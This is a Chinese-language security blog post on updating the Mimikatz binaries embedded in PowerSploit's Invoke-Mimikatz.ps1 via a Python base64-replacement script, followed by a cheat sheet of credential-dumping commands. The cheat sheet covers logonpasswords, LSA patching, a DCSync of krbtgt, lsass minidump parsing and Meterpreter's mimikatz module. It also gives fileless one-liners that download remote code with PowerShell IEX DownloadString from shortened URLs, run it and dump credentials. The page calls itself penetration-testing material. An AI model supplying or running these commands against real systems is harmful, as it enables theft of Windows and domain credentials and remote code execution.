---
title: "更新 Invoke-Mimikatz.ps1 中的 Mimikatz 版本为最新 2.2.0 20200519 版本"
source: https://mrxn.net/jswz/666.html
---

# 更新 Invoke-Mimikatz.ps1 中的 Mimikatz 版本为最新 2.2.0 20200519 版本

[Mrxn](https://mrxn.net/author/1)* 发表于2020/6/24 12:27
* 5777浏览
* [0评论](#comment)
* 30分钟
  阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

[![更新 Invoke-Mimikatz.ps1 中的 Mimikatz 版本为最新 2.2.0 20200519 版本](https://mrxn.net/content/uploadfile/202006/18021592972924.png "点击查看原图")](https://mrxn.net/content/uploadfile/202006/18021592972924.png)
  
  
  
  

invoke-mimikatz是什么？invoke-mimikatz是powersploit
[渗透测试](https://mrxn.net/tag/%E6%B8%97%E9%80%8F)
套装中的一个powershell版本的mimikatz工具，用来抓取windows操作系统中的密码。
  
  

但是其内置的
[mimikatz](https://mrxn.net/tag/mimikatz)
版本过低，导致在实际使用中会多多少少的有一些问题。
  
  
  
  

通过查看
<https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1>
脚本内容知道 $PEBytes64 和 $PEBytes32 变量，应该是把 Mimikatz 的两个版本的EXE文件进行base64编码.
  
  

那就只替换最新的试试，使用 python3 替换完成更新代码 update.py 如下：

```
import fileinput
import base64

with open("./Win32/mimikatz.exe", "rb") as f:
    win32 = base64.b64encode(f.read()).decode()

with open("./x64/mimikatz.exe", "rb") as f:
    x64 = base64.b64encode(f.read()).decode()

for line in fileinput.FileInput("./Invoke-Mimikatz.ps1", inplace=1):

  line = line.rstrip('\r\n')
  if "$PEBytes64 = " in line:
    print("$PEBytes64 = '" + x64 + "'")
  elif "$PEBytes32 = " in line:
    print("$PEBytes32 = '" + win32 + "'")
  else:
    print(line)
```

将 update.py 脚本和 Invoke-Mimikatz.ps1 放在 mimikatz\_trunk 解压后的同目录。执行即可更新完毕。
  
  

更新后的效果如首图所示，从


Mimikatz 2.1 2016年的版本更新到最新的 2.2.0 20200519 Windows 10 2004 (build 19041) 版本。
  
  

顺带提一下：

Mimikatz

使用时需要高权限，至少是 administrator 权限

Mimikatz

抓取密码的命令需要 system 权限，可以先进行提权，
  
  

基本使用：
  
  

privilege::debug  //提升权限（从administrator提升到system）如果是system权限执行，可省略
  
  
  
  

抓取hash：
  
  

sekurlsa::logonpasswords   //获取当前在线用户的明文密码（需要高权限运行）
  
  

lsadump::lsa /patch   //获取当前此计算机存在过用户的NTLMHASH
  
  
  
  

mimikatz 的其他命令：
  
  

lsadump::sam SYSTEM.hiv //导出所有用户口令 使用Volue Shadow Copy获得SYSTEM、SAM备份
  
  

通过内存文件获取口令
  
  

sekurlsa::minidump lsass.dmp
  
  

sekurlsa::logonPasswords full
  
  

拉取 rd.adsecurity.org 域中的 KRBTGT 用户帐户的密码数据
  
  

lsadump::dcsync /domain:rd.adsecurity.org /user:krbtgt
  
  

拉取 lab.adsecurity.org 域中 ADSDC03 域控制器的计算机帐户的密码数据
  
  

lsadump::dcsync /domain:lab.adsecurity.org /user:adsdc03$
  
  
  
  

msf使用 mimikatz：
  
  

在meterpreter中加载mimikatz模块
  
  

load mimikatz
  
  
  
  

然后help，查看参数信息：
  
  

kerberos          Attempt to retrieve kerberos creds
  
  

livessp           Attempt to retrieve livessp creds
  
  

mimikatz\_command  Run a custom command
  
  

msv               Attempt to retrieve msv creds (hashes)
  
  

ssp               Attempt to retrieve ssp creds
  
  

tspkg             Attempt to retrieve tspkg creds
  
  

wdigest           Attempt to retrieve wdigest creds
  
  
  
  

常用命令为kerberos和msv。
  
  
  
  

无文件落地执行

mimikatz

：
  
  

在Windows server 2008 及之前 可以使用如下命令：
  
  

powershell "IEX (New-Object Net.WebClient).DownloadString('
<https://url.cn/SdU3mjdm>
'); Invoke-Mimikatz -DumpCreds"
  
  

在Windows server 2009 及之后，可以使用如下命令：
  
  

powershell "IEX (New-Object Net.WebClient).DownloadString('
<https://url.cn/wv7uNQrc>
'); Invoke-Mimikatz"
  
  

然后抓取hash即可抓取 NTLM。
  
  

注意，目前上面这个新版的脚本来自我的 GitHub 仓库:
<https://github.com/Mr-xn/Penetration_Testing_POC/blob/master/tools/Invoke-Mimikatz.ps1>
，
  
  
各位大佬点个star啊！里面收藏了我所看到过的觉得有价值的渗透测试工具，POC，Android
[渗透测试](https://mrxn.net/tag/%E6%B8%97%E9%80%8F)
、脱壳相关的文章。
  
  
目前会有 BUG ,细心的可以看到图上的第二个命令行窗口。欢迎能修复BUG的大佬可以 Pull ！
  
  
  
  

参考：



鸿鹄实验室公众号文章

-

渗透tips---->更新你的invoke-mimikatz

* 标签：
* [#
  攻击](https://mrxn.net/tag/%E6%94%BB%E5%87%BB)
* [#
  渗透测试](https://mrxn.net/tag/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95)
* [#
  黑客工具](https://mrxn.net/tag/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7)
* [#
  分享](https://mrxn.net/tag/%E5%88%86%E4%BA%AB)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录

×



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：
[Mrxn's Blog](https://mrxn.net/)
  
文章标题：
[更新 Invoke-Mimikatz.ps1 中的 Mimikatz 版本为最新 2.2.0 20200519 版本](https://mrxn.net/jswz/666.html)
  
文章链接：
<https://mrxn.net/jswz/666.html>
  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

设备上扫码阅读



var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/666.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

手机扫码阅读



var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/666.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});